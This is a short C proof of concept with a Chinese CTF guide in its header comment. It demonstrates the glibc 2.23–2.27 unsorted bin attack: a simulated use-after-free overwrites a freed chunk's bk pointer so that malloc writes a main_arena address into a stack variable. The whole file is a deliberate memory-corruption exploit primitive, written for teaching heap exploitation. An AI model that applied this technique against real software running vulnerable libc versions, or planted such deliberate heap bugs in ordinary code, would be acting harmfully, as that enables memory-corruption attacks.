/*
 * 中文导读（CTF 版）
 *
 * 手法：unsorted_bin_attack
 * 文件标注范围：2.23 ~ 2.27
 * 模拟漏洞：用一次 UAF 改写 unsorted chunk 的 bk 指针。2.26/2.27 已经引入了
 * tcache，所以 victim 特意用 request=0x410（对应物理 size=0x420）分配，
 * 让它直接落入 unsorted 而不会被 tcache 拦截。
 * 核心流程：从 unsorted 摘链时会执行 bck->fd = unsorted_chunks(av)，
 * 这一步会把 main_arena 的地址写到我们伪造的 target 上。
 * 成功判据：target 从初始的 0 变成一个非零的 main_arena 指针；2.28 引入的
 * bck->fd 一致性检查已经把这种经典写法堵死了。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main(){

	unsigned long stack_var=0;

	unsigned long *p=malloc(0x410);

	malloc(500);

	free(p);

	// ---------------- 漏洞模拟开始：改写 unsorted victim 的 bk 指针。 ----------------

	p[1]=(unsigned long)(&stack_var-2);

	//------------------------------------

	malloc(0x410);

	assert(stack_var != 0);
	fprintf(stderr, "[+] unsorted：目标写成功\n");
}
